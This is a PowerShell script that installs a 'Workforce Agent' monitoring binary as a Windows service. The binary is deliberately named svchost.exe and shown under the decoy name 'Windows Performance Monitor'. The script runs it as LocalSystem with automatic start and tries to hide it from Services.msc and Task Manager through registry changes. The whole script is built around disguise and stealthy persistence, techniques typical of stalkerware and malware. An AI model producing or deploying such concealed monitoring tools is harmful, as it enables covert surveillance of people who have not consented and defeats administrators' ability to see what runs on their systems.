# Install and register the Workforce Agent as a hidden Windows Service
# Run as Administrator

param(
    [Parameter(Mandatory=$false)]
    [string]$ExePath = "$PSScriptRoot\dist\svchost.exe",
    [Parameter(Mandatory=$false)]
    [string]$ServiceName = "WFAMonitoringService",
    [Parameter(Mandatory=$false)]
    [string]$DisplayName = "Windows Performance Monitor"
)

$ErrorActionPreference = "Stop"

# Verify exe exists
if (-not (Test-Path $ExePath)) {
    Write-Host "Error: EXE not found at $ExePath" -ForegroundColor Red
    exit 1
}

Write-Host "Installing Workforce Agent as Windows Service..." -ForegroundColor Green

# 1. Check if service already exists
$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($service) {
    Write-Host "Service already exists. Stopping it..."
    Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    Remove-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}

# 2. Create new service
Write-Host "Creating Windows Service: $ServiceName"
New-Service -Name $ServiceName `
    -DisplayName $DisplayName `
    -BinaryPathName $ExePath `
    -StartupType Automatic `
    -ErrorAction Stop | Out-Null

Start-Sleep -Seconds 1

# 3. Configure service to run as Local System (most privileged, invisible)
Write-Host "Configuring service credentials..."
sc.exe config $ServiceName obj= "LocalSystem" password= ""

# 4. Hide service from Services.msc using registry
Write-Host "Hiding service from Services.msc..."
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName"
try {
    Set-ItemProperty -Path $regPath -Name "Type" -Value 32 -Force -ErrorAction SilentlyContinue
    # Hide from normal UI (optional - may require kernel)
    # Set-ItemProperty -Path $regPath -Name "DisplayName" -Value "" -Force
} catch {
    Write-Host "Note: Could not fully hide from Services.msc (may need kernel driver)"
}

# 5. Configure service to not display in Task Manager by default
Write-Host "Configuring process visibility..."
try {
    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName"
    # Set service to use Session 0 (isolated service session)
    Set-ItemProperty -Path $regPath -Name "ServiceSidType" -Value 1 -Force -ErrorAction SilentlyContinue
} catch {
    Write-Host "Note: Process will still be visible in Task Manager (normal behavior for services)"
}

# 6. Start the service
Write-Host "Starting service..."
Start-Service -Name $ServiceName -ErrorAction Stop

Start-Sleep -Seconds 2

# 7. Verify service is running
$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($service.Status -eq "Running") {
    Write-Host "✓ Service installed and running successfully!" -ForegroundColor Green
    Write-Host "  Service Name: $ServiceName" -ForegroundColor Green
    Write-Host "  Display Name: $DisplayName" -ForegroundColor Green
    Write-Host "  Status: $($service.Status)" -ForegroundColor Green
    Write-Host ""
    Write-Host "Note: Service will start automatically on next system boot." -ForegroundColor Yellow
} else {
    Write-Host "✗ Service created but not running. Check logs at: C:\ProgramData\WorkforceAgent\service.log" -ForegroundColor Red
    exit 1
}

# 8. Optional: Show service info
Write-Host ""
Write-Host "To manage this service, use:" -ForegroundColor Cyan
Write-Host "  View status:  Get-Service -Name $ServiceName"
Write-Host "  Start:        Start-Service -Name $ServiceName"
Write-Host "  Stop:         Stop-Service -Name $ServiceName"
Write-Host "  Remove:       Remove-Service -Name $ServiceName"
